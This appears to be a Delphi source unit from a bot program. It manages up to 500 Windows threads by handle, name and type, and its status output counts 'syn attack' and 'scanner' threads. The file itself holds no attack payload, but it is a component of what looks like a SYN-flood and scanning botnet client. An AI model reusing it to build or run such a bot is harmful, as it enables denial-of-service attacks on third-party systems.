unit untThreads;

interface

uses
  windows,
  untFunctions,
  untGlobalDeclare;

const
  max_threads  = 500;
  thread_syn   = 1;
  thread_scan  = 2;
  thread_other = 3;

type
  tthreadtype = record
    threadhandle        :thandle;
    threadtype          :integer;
    threadname          :string;
  end;

var
  otherhandle   :array[0..max_threads] of tthreadtype;
  threadhandle  :array[0..max_threads] of tthreadtype;
  threadcount   :integer;

  function thread_start(intthreads, inttype: integer; name: string; pproc, pparam: pointer; endallother: boolean): integer;
  function thread_stop(intthreads, inttype: integer; threadname: string): integer;
  function thread_info: string;
  function thread_allinfo: string;
  function thread_exist(handle: thandle; name: string): boolean;
  function thread_stophandle(handle: thandle): integer;
  function thread_stopname(name: string): integer;

implementation

function thread_exist(handle: thandle; name: string): boolean;
var
  iloop                 :integer;
begin
  result := false;

  for iloop := 0 to max_threads -1 do
    if handle > 0 then
    begin
      if (otherhandle[iloop].threadhandle = handle) or
         (otherhandle[iloop].threadname = name) or
         (threadhandle[iloop].threadhandle = handle) or
         (threadhandle[iloop].threadname = name) then
         begin
           result := true;
           break;
         end;
    end else
    begin
      if (otherhandle[iloop].threadname = name) or
         (threadhandle[iloop].threadname = name) then
         begin
           result := true;
           break;
         end;
    end;
end;

function thread_allinfo: string;
var
  iloop                 :integer;
begin
  result := '[threads] ';

  for iloop := 0 to max_threads -1 do
    if otherhandle[iloop].threadhandle > 0 then
      result := result + otherhandle[iloop].threadname+'['+inttostr(otherhandle[iloop].threadhandle)+'] ';

  delete(result, length(result), 1);
end;

function thread_info: string;
var
  scanner_thread        :integer;
  attack_thread         :integer;
  other_thread          :integer;
  iloop                 :integer;
begin
  scanner_thread        := 0;
  attack_thread         := 0;
  other_thread          := 0;

  for iloop := 0 to max_threads -1 do
  begin
    if otherhandle[iloop].threadhandle > 0 then
      inc(other_thread);

    if threadhandle[iloop].threadhandle > 0 then
      if threadhandle[iloop].threadtype = 1 then
        inc(attack_thread)
      else if threadhandle[iloop].threadtype = 2 then
        inc(scanner_thread);
  end;

  result := '[threads] ' +
            inttostr(scanner_thread) + ' scanner thread(s). ' +
            inttostr(attack_thread) + ' syn attack thread(s). ' +
            inttostr(other_thread) + ' other thread(s).';
end;

function thread_stopname(name: string): integer;
var
  iloop         :integer;
  exitcode      :cardinal;
  temphandle    :cardinal;
begin
  result := 0;

  for iloop := 0 to max_threads -1 do
    if (threadhandle[iloop].threadname = name) then
     begin
       temphandle := threadhandle[iloop].threadhandle;
       threadhandle[iloop].threadhandle := 0;
       threadhandle[iloop].threadtype := 0;
       threadhandle[iloop].threadname := '';
       getexitcodethread(temphandle, exitcode);
       if terminatethread(temphandle, exitcode) then
       begin
         inc(result);
         dec(threadcount);
       end;
       closehandle(temphandle);
     end else
     if (otherhandle[iloop].threadname = name) then
     begin
       temphandle := otherhandle[iloop].threadhandle;
       otherhandle[iloop].threadhandle := 0;
       otherhandle[iloop].threadtype := 0;
       otherhandle[iloop].threadname := '';
       getexitcodethread(temphandle, exitcode);
       if terminatethread(temphandle, exitcode) then
       begin
         inc(result);
         dec(threadcount);
       end;
       closehandle(temphandle);
     end;

  if threadcount < 0 then threadcount := 0;
end;

function thread_stophandle(handle: thandle): integer;
var
  iloop         :integer;
  exitcode      :cardinal;
begin
  result := 0;

  for iloop := 0 to max_threads -1 do
    if (threadhandle[iloop].threadhandle = handle) then
     begin
       getexitcodethread(threadhandle[iloop].threadhandle, exitcode);
       if terminatethread(threadhandle[iloop].threadhandle, exitcode) then
       begin
         inc(result);
         dec(threadcount);
       end;
       closehandle(threadhandle[iloop].threadhandle);
       threadhandle[iloop].threadhandle := 0;
       threadhandle[iloop].threadtype := 0;
       threadhandle[iloop].threadname := '';
     end else
     if (otherhandle[iloop].threadhandle = handle) then
     begin
       getexitcodethread(otherhandle[iloop].threadhandle, exitcode);
       if terminatethread(otherhandle[iloop].threadhandle, exitcode) then
       begin
         inc(result);
         dec(threadcount);
       end;
       closehandle(otherhandle[iloop].threadhandle);
       otherhandle[iloop].threadhandle := 0;
       otherhandle[iloop].threadtype := 0;
       otherhandle[iloop].threadname := '';
     end;

  if threadcount < 0 then threadcount := 0;
end;

function thread_stop(intthreads, inttype: integer; threadname: string): integer;
var
  iloop         :integer;
  exitcode      :cardinal;
begin
  result := 0;

  for iloop := 0 to intthreads -1 do
    if (threadhandle[iloop].threadhandle > 0) and
       ((inttype = 0) or (threadhandle[iloop].threadtype = inttype) or
         (threadhandle[iloop].threadname = threadname)) then
       begin
         getexitcodethread(threadhandle[iloop].threadhandle, exitcode);
         if terminatethread(threadhandle[iloop].threadhandle, exitcode) then
         begin
           inc(result);
           dec(threadcount);
         end;
         closehandle(threadhandle[iloop].threadhandle);
         threadhandle[iloop].threadhandle := 0;
         threadhandle[iloop].threadtype := 0;
         threadhandle[iloop].threadname := '';
       end;

  if threadcount < 0 then threadcount := 0;
end;

function thread_start(intthreads, inttype: integer; name: string; pproc, pparam: pointer; endallother: boolean): integer;
var
  iloop         :integer;
  jloop         :integer;
  threadid      :dword;
  exitcode      :cardinal;
begin
  if endallother then
    thread_stop(max_threads, inttype, name);

  result := 0;

  for iloop := 0 to intthreads -1 do
    for jloop := 0 to max_threads -1 do
      if inttype = 3 then
      begin
        if otherhandle[jloop].threadhandle = 0 then
        begin
          otherhandle[jloop].threadhandle := createthread(nil, 0, pproc, pparam, 0, threadid);
          if otherhandle[jloop].threadhandle > 0 then
          begin
            otherhandle[jloop].threadtype := inttype;
            otherhandle[jloop].threadname := name;
            inc(result);
            inc(threadcount);
            break;
          end else
          begin
            getexitcodethread(otherhandle[jloop].threadhandle, exitcode);
            if terminatethread(otherhandle[jloop].threadhandle, exitcode) then
              otherhandle[jloop].threadhandle := 0;
          end;
        end;
      end else
      begin
        if threadhandle[jloop].threadhandle = 0 then
        begin
          threadhandle[jloop].threadhandle := createthread(nil, 0, pproc, pparam, 0, threadid);
          if threadhandle[jloop].threadhandle > 0 then
          begin
            threadhandle[jloop].threadtype := inttype;
            threadhandle[jloop].threadname := name;
            inc(result);
            inc(threadcount);
            break;
          end else
          begin
            getexitcodethread(threadhandle[jloop].threadhandle, exitcode);
            if terminatethread(threadhandle[jloop].threadhandle, exitcode) then
              threadhandle[jloop].threadhandle := 0;
          end;
        end;
      end;

  if threadcount < 0 then threadcount := 0;
end;

end.

